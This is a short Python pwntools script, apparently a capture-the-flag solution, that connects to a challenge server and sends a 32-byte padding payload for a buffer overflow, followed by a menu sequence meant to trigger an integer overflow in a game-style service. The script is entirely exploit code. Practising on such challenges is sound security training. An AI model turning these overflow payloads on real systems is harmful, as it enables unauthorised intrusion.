from pwn import *

conn = remote('w4owkcjzvv0e.boroctf.com', 53217)

# Faza 1 - buffer overflow
conn.sendline(b'A'*32 + b'\xff\xff\xff\xff')

# Faza 2 - integer overflow
conn.sendline(b'3')  # Use Item
conn.sendline(b'1')  # Health Potion
conn.sendline(b'2')  # The Beast
conn.sendline(b'1')  # amount = 1

print(conn.recvall().decode())
